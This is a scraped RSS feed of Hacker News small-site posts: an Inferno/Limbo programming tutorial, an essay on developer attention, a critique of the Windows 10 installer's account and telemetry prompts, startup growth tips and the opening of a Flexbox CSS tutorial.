</ul>
<h3 id="build-inferno">Build Inferno</h3>
<p>Steps provided are targeted for <code>linux/amd64</code> as a host for Inferno.</p>
<p>The official <a href="https://bitbucket.org/inferno-os/inferno-os/">Inferno</a> tree is hosted over <a href="https://git-scm.com/">Git</a>.</p>
<p>The <a href="https://code.9front.org/hg/purgatorio/">purgatorio</a> fork is hosted by the 9front project over <a href="https://www.mercurial-scm.org/">Mercurial</a>.</p>
<p>Cloning:</p>
<div><pre><code data-lang="text">$ hg clone https://code.9front.org/hg/purgatorio
destination directory: purgatorio
requesting all changes
adding changesets
adding manifests
adding file changes
added 86 changesets with 10904 changes to 10545 files
new changesets 78950db8e089:749c484c1b9c
updating to branch default
9584 files updated, 0 files merged, 0 files removed, 0 files unresolved
$ cd purgatorio/
$ ls
acme                     FreeBSD  libdynld     libprefab      mkfile       scripts
AIX                      icons    libfreetype  libsec         mkfiles      services
appl                     include  libinterp    libtk          module       Solaris
bitbucket-pipelines.yml  Inferno  libkern      limbo          NetBSD       tools
CHANGES                  INSTALL  libkeyring   Linux          NOTICE       usr
dis                      Irix     liblogfs     locale         Nt           utils
doc                      keydb    libmath      MacOSX         OpenBSD
Dockerfile               lib      libmemdraw   makemk-AIX.sh  os
DragonFly                lib9     libmemlayer  makemk.sh      Plan9
emu                      libbio   libmp        man            POSTINSTALL
fonts                    libdraw  libnandfs    mkconfig       README.md
$
</code></pre></div><p><strong>Read the</strong> <code>INSTALL</code> <strong>file!</strong></p>
<p>Update our <code>$HOME/.profile</code> to reflect the Inferno install, adapt this to your directories:</p>
<div><pre><code data-lang="text">export EMU='-g1280x960 -c1'
export INFERNO=$HOME/repos/purgatorio
export PATH=$PATH:$INFERNO/Linux/386/bin
</code></pre></div><p>Reload our shell currently in the purgatorio root tree:</p>
<div><pre><code data-lang="text">$ source $HOME/.profile
$
</code></pre></div><p>Update the <code>mkconfig</code> file to reflect our environment, adapt this as needed:</p>
<div><pre><code data-lang="text">ROOT=$HOME/repos/purgatorio

TKSTYLE=std

CONF=emu

SYSHOST=Linux		# build system OS type (Hp, Inferno, Irix, Linux, MacOSX, Nt, Plan9, Solaris)
SYSTARG=$SYSHOST	# target system OS type (Hp, Inferno, Irix, Linux, Nt, Plan9, Solaris)

OBJTYPE=386

OBJDIR=$SYSTARG/$OBJTYPE

&lt;$ROOT/mkfiles/mkhost-$SYSHOST			# variables appropriate for host system
&lt;$ROOT/mkfiles/mkfile-$SYSTARG-$OBJTYPE	# variables used to build target object type
</code></pre></div><p>Enable multi-arch support on debian-based distributions if on amd64 (64-bit) as Inferno is 32-bit only:</p>
<div><pre><code data-lang="text">$ dpkg --add-architecture i386
$ apt-get update
</code></pre></div><p>Install dependencies required to compile Inferno, this example shows dependencies for debian-based (Ubuntu) distributions:</p>
<div><pre><code data-lang="text">$ apt install libc6-dev-i386 libxext6:i386 libx11-dev:i386 libxext-dev:i386 libfontconfig1-dev:i386
…
$
</code></pre></div><p>Build <code>mk</code> which will be used to bootstrap the rest of the process:</p>
<p>Build and install Inferno!</p>
<div><pre><code data-lang="text">$ mk mkdirs
…
$ mk clean
…
$ mk install
…
$
</code></pre></div><h3 id="start-inferno">Start Inferno</h3>
<p>A graphical environment should appear.</p>
<p>You can make the gui window for Inferno larger by passing in a different size to <code>emu</code> as per <a href="http://man.postnix.pw/purgatorio/1/emu">the manual</a>:</p>
<div><pre><code data-lang="text">-gXsizexYsize
	Define screen width and height in pixels.  The default
	values are 640x480 and the minimum values are 64x48.
	Values smaller than the minimum or greater than the
	available display size are ignored.
</code></pre></div><p>thus:</p>
<p>and so forth.</p>
<p>Some programs can be found under the start menu in the bottom left corner decorated with the <a href="https://seh.dev/limbo-intro/vitanuova.com/">Vita Nuova</a> logo:</p>
<p><img src="http://www.vitanuova.com/images/vitanuova.jpg" alt="Vita Nuova’s logo"></p>
<p>The <code>Shell</code> entry in the start menu will provide a shell-interpreter window from which further commands can be run inside Inferno.</p>
<h3 id="preparation">Preparation</h3>
<div><pre><code data-lang="text">% cd $home/appl
% os git clone https://github.com/henesy/socketh-limbo
% cd socketh-limbo
% lc
.git/     LICENSE   README.md
% touch .gitignore socketh.b
% acme socketh.b
</code></pre></div><p><code>.gitignore</code>:</p>
<p>Limbo ‘libraries’, known as ‘modules’, and ‘programs’ are one and the same in terms of semantics, bar ‘libraries’ having module <code>.m</code> files which are similar to header <code>.h</code> files in C.</p>
<p>As such, the boilerplate for most Limbo programs is very similar. We can initialize our main file as follows.</p>
<p><code>socketh.b</code>:</p>
<div><pre><code data-lang="c">implement SocketH;

include <span>"sys.m"</span>;
	<span>sys</span>: Sys;

include <span>"draw.m"</span>;
include <span>"arg.m"</span>;

<span>SocketH</span>: module {
	<span>init</span>: fn(<span>nil</span>: ref Draw<span>-&gt;</span>Context, <span>argv</span>: list of string);
};


<span># An implementation of the SocketH chat protocol
</span><span></span>init(<span>nil</span>: ref Draw<span>-&gt;</span>Context, <span>argv</span>: list of string) {
	sys <span>=</span> load Sys Sys<span>-&gt;</span>PATH;
	<span>arg</span> :<span>=</span> load Arg Arg<span>-&gt;</span>PATH;
	<span>if</span>(arg <span>==</span> nil)
		raise <span>"could not load arg"</span>;



	exit;
}
</code></pre></div><p>We can break this down a bit.</p>
<p><code>implement</code> declares a module by name.</p>
<p>A module definition must be provided indicating exported functions from the module:</p>
<div><pre><code data-lang="text">SocketH: module {
	init: fn(nil: ref Draw-&gt;Context, argv: list of string);
};
</code></pre></div><p>Note how a variable name of <code>nil</code> is used to drop assignment of a value.</p>
<p>The <code>init</code> function is special in shell-loaded Limbo programs and its signature <em>must</em> match what the shell expects the init function interface to be.</p>
<p>Functionally, <code>init</code> is equivalent to <code>main</code> in most other languages.</p>
<p><code>include</code> imports an external module’s definitions into our scope.</p>
<p><code>load</code> performs the dynamic loading of a module at runtime.</p>
<p><code>exit</code> performs the dynamic un-loading of a module at runtime.</p>
<p><code>raise</code> will throw an exception with a given string as its content.</p>
<p>We refer to names inside a module using the <code>-&gt;</code> operator.</p>
<p>We can jointly assign and declare in one step using the <code>:=</code> operator.</p>
<p>Curly braces are optional.</p>
<p>Semicolons are not.</p>
<p>Note the absence of a reserved <code>main</code> module. This is due to each <code>.dis</code> file, potentially an independent module, being theoretically loadable in its own right. A reserved name would cause significant issues with namespaces ☺.</p>
<h3 id="setting-up-a-workflow">Setting up a workflow</h3>
<p>Compiling our program should be as straightforward as running the Limbo compiler against our source file:</p>
<div><pre><code data-lang="text">% limbo socketh.b
% lc
.git/		LICENSE		socketh.b
.gitignore	README.md	socketh.dis
% socketh.dis
%
</code></pre></div><p>This program does nothing right now, but that’s fine.</p>
<p>Note how we can omit the <code>./</code> when running <code>.dis</code> programs.</p>
<p>Calling the limbo compiler each time is a bit of a pain, and if we start using commandline flags this will become tedious to type.</p>
<p>In acme, we could type the text we want to run in a tag or window and middle-click said text to run the compilation (or more!) on-demand. In Inferno, acme comes with a <code>Limbo</code> command in the default window tag, but that only works for one file.</p>
<p>We can simplify this process by writing a <s>makefile</s> <a href="http://doc.cat-v.org/bell_labs/mk/">mkfile</a>!</p>
<p><code>mkfile</code>:</p>
<div><pre><code data-lang="text">&lt;/mkconfig

DISBIN = /dis

TARG = socketh.dis

&lt;/mkfiles/mkdis
</code></pre></div><p>Mk semantics are similar to make with some changes.</p>
<p>How mk will behave inside Inferno using the <code>mkdis</code> mkfile as the trailing import:</p>
<ul>
<li>Mk can import outside mkfiles using the <code>&lt;</code> operator</li>
<li><code>mk</code> will call <code>mk all</code> which resolves to the <code>all</code> (default) target</li>
<li><code>mk install</code> calls the <code>all</code> target and copies the <code>TARG</code> file(s) to the <code>DISBIN</code> destination directory</li>
<li><code>mk clean</code> removes files such as <code>.dis</code> and <code>.sbl</code> from the working directory</li>
<li><code>mk nuke</code> calls the <code>clean</code> target as well as delete the ‘target’ files such as the <code>/dis/socketh</code> binary if the <code>install</code> target has been called</li>
</ul>
<p>A demonstration:</p>
<div><pre><code data-lang="text">% lc
.git/		LICENSE		mkfile
.gitignore	README.md	socketh.b
% mk
limbo -I/module -gw socketh.b
socketh.b:15: warning: argument argv not referenced
% lc
.git/		LICENSE		mkfile		socketh.dis
.gitignore	README.md	socketh.b	socketh.sbl
% mk install
rm -f /dis/socketh.dis &amp;&amp; cp socketh.dis /dis/socketh.dis
% mk clean
rm -f *.dis *.sbl
% whatis socketh
/dis/socketh.dis
% mk nuke
rm -f *.dis *.sbl
cd /dis; rm -f socketh.dis
% whatis socketh.dis
socketh.dis: not found
% lc
.git/		LICENSE		mkfile
.gitignore	README.md	socketh.b
%
</code></pre></div><p>Note the Limbo compiler flags being passed by default now for the <code>all</code> target.</p>
<p>At this point, I usually add <code>mk clean &amp;&amp; mk</code> to my acme tag and run that for multi-file or more complex Limbo programs. This flow is very similar to how I do development under Plan 9.</p>
<h3 id="common-patterns">Common patterns</h3>
<h4 id="commandline-flags">Commandline flags</h4>
<p>We can use <a href="https://seh.dev/limbo-intro/man.postnix.pw/purgatorio/2/arg">arg(2)</a> to process commandline flags:</p>
<div><pre><code data-lang="c"><span>…</span>

<span>chatty</span>: <span>int</span>	<span>=</span> <span>0</span>;	<span>#</span> Verbose debug output


<span># An implementation of the SocketH chat protocol
</span><span></span>init(<span>nil</span>: ref Draw<span>-&gt;</span>Context, <span>argv</span>: list of string) {
	sys <span>=</span> load Sys Sys<span>-&gt;</span>PATH;
	<span>arg</span> :<span>=</span> load Arg Arg<span>-&gt;</span>PATH;
	<span>if</span>(arg <span>==</span> nil)
		raise <span>"could not load arg"</span>;

	<span>addr</span>: string <span>=</span> <span>"tcp!*!9090"</span>;

	arg<span>-&gt;</span>init(argv);
	arg<span>-&gt;</span>setusage(<span>"socketh [-D] [-a addr]"</span>);

	<span>while</span>((<span>c</span> :<span>=</span> arg<span>-&gt;</span>opt()) <span>!=</span> <span>0</span>)
		<span>case</span> c {
		<span>'D'</span> <span>=&gt;</span>
			chatty<span>++</span>;

		<span>'a'</span> <span>=&gt;</span>
			addr <span>=</span> arg<span>-&gt;</span>earg();

		<span>*</span> <span>=&gt;</span>
			arg<span>-&gt;</span>usage();
		}

	argv <span>=</span> arg<span>-&gt;</span>argv();



	exit;
}
</code></pre></div><p>We can see how these flags are parsed and how these functions act:</p>
<div><pre><code data-lang="text">% mk
mk: 'all' is up to date
% socketh -h
usage: socketh [-D] [-a addr]
% socketh -D
% socketh -a
usage: socketh [-D] [-a addr]
% socketh -a -D
% socketh -D -a
usage: socketh [-D] [-a …</code></pre></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://seh.dev/limbo-intro/">https://seh.dev/limbo-intro/</a></em></p>]]>
            </description>
            <link>https://seh.dev/limbo-intro/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030961</guid>
            <pubDate>Mon, 09 Nov 2020 02:43:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Attention Is My Most Valuable Asset for Productivity as a Software Developer]]>
            </title>
            <description>
<![CDATA[
Score 226 | Comments 89 (<a href="https://news.ycombinator.com/item?id=25030938">thread link</a>) | @zwbetz
<br/>
November 8, 2020 | https://zwbetz.com/attention-is-my-most-valuable-asset-for-productivity-as-a-software-developer/ | <a href="https://web.archive.org/web/*/https://zwbetz.com/attention-is-my-most-valuable-asset-for-productivity-as-a-software-developer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-content">
      <div>
        <div>
          <div>
            
  
  
  <p>
    
    
    
    <strong>Published: </strong>2020-11-08

    
    
      
      
        • <strong>Lastmod: </strong>2020-11-09

      
    
    
    
    
      <br>
      <span>
        <strong>Tags: </strong>
        
          
          
          
        
          
          
          
        
          
          
          
        
        <a href="https://zwbetz.com/tags/life/">life</a> • <a href="https://zwbetz.com/tags/attention/">attention</a> • <a href="https://zwbetz.com/tags/productivity/">productivity</a>
      
    </span>
  </p>
  
  
  
  

<p>Like a tightly written function, I prefer to exit early if no work should be done. So, if you disagree with these definitions and assumptions, now’s a good time to stop reading.</p>
<ul>
<li><strong>Sustainable productivity:</strong> The maximum rate of quality work output, without loss to the wellbeing of the developer</li>
<li><strong>Quality work:</strong> Software that meets requirements, is valuable to users, is maintainable, and is as bug free as possible</li>
<li><strong>Attention:</strong> The limited mental capacity to focus on a task</li>
<li>Sustainable productivity is desired</li>
<li>Attention is essential to sustainable productivity</li>
</ul>
<p>My high-level workflow looks something like this: identify the problem to solve; think on the problem and let ideas percolate; research, discuss, and experiment with these ideas; implement and test the solution; deliver and maintain the solution.</p>
<p>This cycle could repeat many times in a day. Or I could spend days stuck on a single cycle step. Every step in this cycle requires attention. The more attention I can devote, the more cycles I can complete, and the more productive I am.</p>
<p>How long you can focus on a task varies by person. Some people are very good at it out of the box, some people, not so much. Regardless of the hand you were dealt, I believe that focus (the act of devoting your attention) is a skill, and like any skill, can be improved with practice.</p>
<p>So, how can you increase your attention reserves? The most bang for your buck is to organize your outside world in such a way that it’s distraction free as possible. Once you do that, you’ll have more time to practice, and therefore more time to get better.</p>
<p><strong>Build physical strength.</strong> The damage done by sitting 8+ hours a day is underrated. You need a way to offset this damage, especially if you plan to work in this field for decades. Opinions abound on this topic, but I personally prefer deadlifts. There are few movements more primal than picking a heavy object off the ground and standing up with it. You can <a href="https://www.youtube.com/watch?v=wYREQkVtvEc">learn correct technique in little time</a>. I most like deadlifts because you can do them safely, at high weights, into old age. I also like the hand, back, and hip strength they give, to make it that much harder for sitting damage to have its way with you.</p>
<p><strong>Make your place of work boring and tidy.</strong> My office is a spare bedroom. The walls are blank. There’s no tv. There’s a desk, chair, laptop, laptop stand, keyboard, mouse, and mouse pad. There’s a window, which lets enough light in so that I don’t feel like I’m missing a beautiful day, but not too much light to cause screen glare. If I need to work with paper, it’s immediately filed somewhere when done. Like I said, boring and tidy.</p>
<p><strong>Make your smart phone dumb.</strong> My phone has all notifications disabled, except for calls and text messages. Well, and National Hurricane Center alerts, since I live in Louisiana. Unless you’re my wife, you know that I don’t respond to text messages immediately, that’s just how it is. I disabled my social media accounts some time ago. But if you have them, turning off notifications should help curve the urge to compulsively check them.</p>
<p><strong>Be an OS minimalist.</strong> Apps I use less commonly are a keypress combo away. Given this, my dock has only the apps I use on a daily basis:</p>
<ul>
<li>File system explorer</li>
<li>Internet browser</li>
<li>Terminal</li>
<li>Text editor for front-end code and notes</li>
<li>IDE for back-end code</li>
<li>IDE for database</li>
<li>Visual file differ for version control</li>
<li>Email client</li>
<li>Instant message client</li>
</ul>
<p>My desktop alternates between clean and dirty states. Files I’m currently working with live on the desktop. Then they’re filed away into sensible folders when done.</p>
<p><strong>Organize your browser bookmarks.</strong> When I read something useful that I may need to reference later, I file it under a general archive folder. Then more specific items get their own folders. Frequently accessed links are visible on my bookmarks bar under their own folder.</p>
<p><strong>Minimize meetings.</strong> Look, I know some things make sense to discuss face to face, or voice to voice. But if they don’t, then you don’t need a meeting. An email or instant message will suffice.</p>
<p><strong>Finally, use the <a href="https://en.wikipedia.org/wiki/Time_management#The_Eisenhower_Method">The Eisenhower Method</a> to categorize your tasks.</strong> Imagine a grid of 4 quadrants:</p>
<ul>
<li>Important and Urgent</li>
<li>Important and Not Urgent</li>
<li>Not Important and Urgent</li>
<li>Not Important and Not Urgent</li>
</ul>
<p>Important and Urgent tasks have to be dealt with. For me, these are usually major production issues.</p>
<p>Important and Not Urgent tasks should absorb the bulk of your time. For me, this is the plain old development work of implementing features, fixing bugs, and making existing code more maintainable and performant. Also included are building relationships with others and planning ahead.</p>
<p>Not Important and Urgent tasks are nasty attention thieves. They shout out to you in immediacy, but offer little value in return. You know what these are for you. For me, these are most often lazily asked questions, where the asker did not do their due diligence, and expects a top-notch answer immediately. Also included are last-minute meetings, and over-talkative coworkers.</p>
<p>Not Important and Not Urgent tasks are usually not known to your users. Take internal documentation updates as an example. Thing is, they’re an investment in yourself, which means a more productive future “you”. So don’t forget to show them some love in your spare moments.</p>
<p><strong>Further reading.</strong> If you don’t know who Cal Newport is, you’re missing out. He has a whole blog dedicated to this type of thing, and has written books such as <em>Deep Work</em> and <em>Digital Minimalism</em>. Here are some of my favorite articles by him:</p>
<ul>
<li><a href="https://www.calnewport.com/blog/2009/02/04/have-we-lost-our-tolerance-for-a-little-boredom/">Have We Lost Our Tolerance For a Little Boredom?</a></li>
<li><a href="https://www.calnewport.com/blog/2010/06/10/is-allowing-your-child-to-study-while-on-facebook-morally-equivalent-to-drinking-while-pregnant/">Is Allowing Your Child to Study While on Facebook Morally Irresponsible?</a></li>
<li><a href="https://www.calnewport.com/blog/2008/04/07/monday-master-class-how-to-reduce-stress-and-get-more-done-by-building-an-autopilot-schedule/">Monday Master Class: How to Reduce Stress and Get More Done By Building an Autopilot Schedule</a></li>
<li><a href="https://www.calnewport.com/blog/2009/11/24/are-passions-serendipitously-discovered-or-painstakingly-constructed/">Are Passions Serendipitously Discovered or Painstakingly Constructed?</a></li>
<li><a href="https://www.calnewport.com/blog/2018/06/08/jerry-seinfelds-closed-door/">Jerry Seinfeld’s Closed Door</a></li>
</ul>



  
  
  

  
  




          </div>
        </div>
      </div>
    </div></div>]]>
            </description>
            <link>https://zwbetz.com/attention-is-my-most-valuable-asset-for-productivity-as-a-software-developer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030938</guid>
            <pubDate>Mon, 09 Nov 2020 02:39:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Windows 10 Installer Dystopia]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25030752">thread link</a>) | @brenns10
<br/>
November 8, 2020 | https://brennan.io/2020/11/08/windows-10-nightmare-edition/ | <a href="https://web.archive.org/web/*/https://brennan.io/2020/11/08/windows-10-nightmare-edition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
<p><em>Stephen Brennan • 08 November 2020</em></p><p>A few days ago I had the displeasure of helping a friend reinstall Windows on
their laptop, which had previously contained Ubuntu. The reason for their switch
isn’t that important – although I helpfully suggested keeping Linux, it was
their machine and their decision. I didn’t expect the process to be particularly
difficult. After all, I work on operating systems for a living now, so I didn’t
expect any trouble. But to my surprise, I encountered a nearly dystopian
situation before I even got to the desktop.</p>

<p>I started the process by creating a bootable USB from the ISO downloaded from
Microsoft’s <a href="https://www.microsoft.com/en-us/software-download/windows10ISO">download page</a>. It feels weird writing that, but yes, the ISO
seems to be freely, easily downloaded. No product key was required to download,
or even install. The USB creation process was not easy (Microsoft suggests using
Windows to create the bootable USB, a chicken-and-egg problem if ever there was
one). It seems that the standard <code>dd</code> process used by every Linux vendor does
not work here – instead you need to get the correct magic incantations of
partition types and filesystems, and then copy files from the ISO file into the
USB. I ended up falling back to a tool called <a href="https://github.com/slacka/WoeUSB">WoeUSB</a> to do this process,
after three failed manual attempts.</p>

<p>The real fun started after I (finally) successfully booted from the USB and
started through the installation wizard. Cortana loudly greeted me, telling me
she’d walk me through the installation process using my voice. I must say that,
while I don’t really care to have a voice assistant guide me through OS
installation, I can see it helping a lot of folks out there, if it works
properly (I did not test it). I’m glad that Microsoft is at least trying this
out!</p>

<p>I went through the (impressively quick) installation process, and the laptop
automatically rebooted. It prompted me to connect to the Internet, which I
foolishly did. Directly after connecting to WiFi, the wizard asked me to login
with a Microsoft account!</p>

<p>I chuckled internally. “Classic Microsoft, asking for a silly cloud login just
to use Windows,” I thought. I don’t know my friend’s MS account login, and even
if I did I wouldn’t link their OS account to some cloud account!</p>

<p>I searched for the cancel button, but couldn’t find one. I tried to submit the
form with empty username and password, but that didn’t work. Realizing that I
might be trapped, I got my phone and fired up Google.  Surely, Microsoft
wouldn’t make it <em>impossible</em> to setup a new PC without linking it to their
cloud, right?</p>

<p>I found an <a href="https://helpdeskgeek.com/windows-10/how-to-setup-windows-10-without-a-microsoft-account/">article</a> which said that, by disabling the Internet connection I
had just configured, I could skip the login process. So, I hit the back button
on the installer. The wizard animated for a moment as if it was working, and
then showed me the same login screen. No matter how many times I hit the back
button, the wizard did not let me go back to the Internet configuration page!</p>

<p>“They haven’t got me yet,” I thought. I held down the power button and rebooted
the computer. Certainly on reboot I would restart the process, and could skip
the Internet configuration, right?</p>

<p>The laptop rebooted to a Microsoft Account login page.</p>

<p>So, I did what any self-respecting, conscientious friend would do for a friend:
<strong>I reinstalled Windows all over again.</strong>  This time, during the setup wizard
after the reboot, I skipped configuring an Internet connection. I was greeted
with this page:</p>

<p><img src="https://brennan.io/images/win10-nointernet.png" alt="win10-nointernet"></p>

<p>This, to me, felt kind of chilling. After all, it’s not like I asked not to use
a MS account. All I did was decide not to configure Internet on my first boot,
which has nothing to do with linking a MS account. After all, maybe I just don’t
have Internet access at the moment, or maybe I forgot the WiFi password.  Why
should the installer lecture me about the benefits of a MS account when simply I
did not configure WiFi? It felt obvious that this was a bald-faced statement:
“we know you’re avoiding our login process, and in a few years we’ll get rid of
this loophole too. Welcome to the future!”</p>

<p>I clicked the text (which wasn’t highlighted as a link or as a button) which
said “Continue with limited setup”. This was an odd phrasing, given that none of
the operating system features I’m familiar with (scheduling processes, providing
a unified interface to hardware devices, etc) requires a cloud account.</p>

<p>At this point, I was allowed to create a “local account” for my friend, and
finish the setup. I was presented with a list of preferences, all helpfully
enabled by default:</p>

<p><img src="https://brennan.io/images/win10-privacy.png" alt="win10-privacy"></p>

<p>The irony here is beautiful. Ads “may be less relevant to you”. The only entity
this harms is Microsoft, being able to avertise at you less (within your very
<em>operating system</em>, no less). Why should they bill this as a negative?</p>

<p>After disabling all of the toggles, the desktop loaded for the first time, I
noticed the following at the bottom right:</p>

<p><img src="https://brennan.io/images/win10-edge.png" alt="win10-edge"></p>

<p>I used MS Edge to install Firefox, and closed it out. On reboot, the login
screen contained two advertisements (!!!) for MS Edge. I returned the laptop to
my friend, grateful I didn’t have to use this horror show of an operating
system.</p>

<h2 id="why-does-this-even-matter">Why does this even matter?</h2>

<p>I spend my workday working on operating systems. Don’t get me wrong, I’m new to
the field, and I have a lot to learn. But as far as I know, <strong>there is no
feature in a modern operating system which requires a cloud account login.</strong> (I
would love to be educated if this claim is false, please get in touch!)</p>

<p>I used to spend my career working on machine learning and data analysis. One
thing I remember from my “past life” is that <strong>there’s nothing better than
linking different types of identifiers together.</strong> If Microsoft can track you by
your “Windows installation ID” and also by your “Microsoft Account”, then <em>of
course</em> they want to link those two identifiers together.</p>

<p>More links means more data about you. What applications you run, what sites you
visit, etc. An operating system as at the root of what you trust when you use a
computer. Do you use online banking? Your operating system can read the password
to your bank account, the balances, and more, directly out of memory! I’m not
suggesting that Windows does that – I just want to illustrate the sort of trust
you implicitly use every time you login to your bank account on Windows (or Mac
OS for that matter). But maybe Microsoft just looks at how frequently you login
to your computer, or what sites you’re interested in. What DNS queries does your
OS resolve? What IP addresses have you used in the last 90 days?</p>

<p>All of the data which is obvious to your operating system, can be linked to your
personal identity when you connect it to a cloud account. Don’t get me wrong,
even if you don’t connect it to a cloud account, you still are getting
incredible amounts of telemetry and tracking recording your every move. But why
would you voluntarily give more links and data to Microsoft?</p>

<p>I don’t think most people understand the sort of data they’re giving over to
Microsoft when they login and use Windows. These dark patterns that Microsoft
employs are sickeningly obvious, and really difficult to avoid. Why would I
trust a company that tries to manipulate its customers into such total data
collection, to be responsible with the data it receives?</p>

<p>I can’t imagine how frustrating it must be to be an operating system developer
at Microsoft. I have a lot of respect for the operating system kernel they make.
It seems to be one of the few major non-Unix like kernels out there. It seems
fascinating and I’d love to learn more about it. But it must be frustrating to
see the product of your hard work go out packaged with software capable of
collecting and tracking your users’ every move, and thrown together with an
installer intent on forcing them to submit to this data collection.</p>



<hr>



  
  

  </div></div>]]>
            </description>
            <link>https://brennan.io/2020/11/08/windows-10-nightmare-edition/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030752</guid>
            <pubDate>Mon, 09 Nov 2020 02:02:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Observations from listening and producing 350 startup podcasts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25030613">thread link</a>) | @JollyMerchant
<br/>
November 8, 2020 | https://viralwegrow.com/blog/observations-from-over-350-startup-podcasts/ | <a href="https://web.archive.org/web/*/https://viralwegrow.com/blog/observations-from-over-350-startup-podcasts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        




<main id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://viralwegrow.com/blog/content/images/size/w300/2020/11/istockphoto-165518488-170667a-1.jpg 300w,
                            https://viralwegrow.com/blog/content/images/size/w600/2020/11/istockphoto-165518488-170667a-1.jpg 600w,
                            https://viralwegrow.com/blog/content/images/size/w1000/2020/11/istockphoto-165518488-170667a-1.jpg 1000w,
                            https://viralwegrow.com/blog/content/images/size/w2000/2020/11/istockphoto-165518488-170667a-1.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://viralwegrow.com/blog/content/images/size/w2000/2020/11/istockphoto-165518488-170667a-1.jpg" alt="Observations from listening and producing 350+ startup podcasts">
            </figure>

            <section>
                <div>
                    <div><p>After listening to over 100 Nathan Latka Podcasts, observing 200 Indiehacker podcasts and watching 50 Microconf talks AND recording 80 episodes myself.</p><p>Here's what I've observed:</p><p><strong>SEO</strong><br>Over 70% of founders credited SEO for being their best source of growth. Invest into ASAP and build up that MOAT.</p><p><strong>FB / Social Media</strong><br>Its a hit or miss. Don't waste time curating the perfect Ad or post. Tim Doyle of Eucalyptus shared that his most profitable Ad was not some high quality video but rather a Doge meme.</p><p><strong>Velocity is everything</strong><br>When building companies you NEED to move fast, there is no alternative to it.</p><p><strong>Product</strong><br>Product led growth is the BEST type, its natural and doesn't feel forced.</p><p><strong>Distribution</strong><br>This is probably just as much if not more important than the content or product itself. Build with distribution in mind, articles / SEO or products.</p><p><strong>SLC</strong><br>NO ONE wants to use an MVP - stop using that mindset. Literally no one other than your Mum/Dad will use a "minimum" "viable" thing you build. Its 2020, the whole patchy product cycle doesn't exist. Aim for Simple, Loveable and Complete (or what I call Minimal Product for Impact) Introduce simple features that meet your north star and make sure they're complete.</p><p><strong>Cold Email</strong><br>Learn to master this, its a great skillset to have in building a company and distributing content.</p><p><strong>Feature Validation</strong><br>Before you build a feature, literally build a simple landing page, run some GAds to it for lifetime deals (this doesn't work always, but for some apps).</p><p><strong>Communicate</strong><br>Build every channel possible to communicate with your user as often as possible for as long as possible.</p><p><strong>No CC No Bueno</strong><br>UNTIL someone gives you their CC, you don't have validation. Do not take anything else as validation other than their CC.</p><p><strong>Timeframe</strong><br>Before you start, set a goal to hit, if you don't hit that goal, be quick to reflect. Build more or move on Last but the MOST important.</p><p><strong>Audience</strong><br>Almost 90% of all the "Super successful" founders attributed having a previous built audience as their reason for success. They built this audience through, podcasts, blogs, Youtube, Tiktok or even Newsletters. BUILD. AN. AUDIENCE. You have a higher chance of succeeding with a shit product and a large audience than vice versa For those that are keen.</p><p>All the best peeps!</p></div><p>-Vaibhav<br></p><blockquote><em><strong>Vaibhav</strong></em> has built several startups into Million Dollar businesses serving Millions of customers across the globe via five2one. He's commonly found on stage talking about AI/ML or Product engineering whilst building his 2nd startup cenario.</blockquote>
                </div>
            </section>

                <section>
    <h3>Subscribe to ViralWeGrow</h3>
    <p>Gain a personal advantage with our weekly insights and analysis into the startup hacks world.</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</main>






        

    </div><p><span></span>
        Could not sign up! Invalid sign up link.
    </p></div>]]>
            </description>
            <link>https://viralwegrow.com/blog/observations-from-over-350-startup-podcasts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030613</guid>
            <pubDate>Mon, 09 Nov 2020 01:33:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to easily understand Flexbox CSS – (Part 1)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25030527">thread link</a>) | @alanmontgomery
<br/>
November 8, 2020 | https://blog.alanmontgomery.co.uk/how-to-easily-understand-flexbox-css-part-1 | <a href="https://web.archive.org/web/*/https://blog.alanmontgomery.co.uk/how-to-easily-understand-flexbox-css-part-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1604884175281/Wd5pu-Bw3.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>In this mini-series, I will be taking you through how to use flexbox CSS, in a simple, easy to understand way. You can really empower your projects and websites with the use of flexbox CSS and reduce your lines of code drastically. I'll also be releasing a video-based tutorial series over on my <a target="_blank" href="https://bit.ly/alanmontgomerycoding">YouTube</a> soon, so look out for that too. Ok... Let's get into it.</p>

<p>Flexbox CSS is a one dimensional layout model/method used for laying out items (HTML elements) in a row or column fashion (horizontal or vertical).</p>
<h2 id="why-flexbox-css">Why Flexbox CSS?</h2>
<p>Long gone are the days of using <code>float</code> and <code>position</code> in CSS to create layouts and responsive layouts. Utilising flexbox allows you to create fully <strong>responsive</strong>, mobile first layouts without needing to write lots of different media queries.</p>
<h2 id="display">Display</h2>
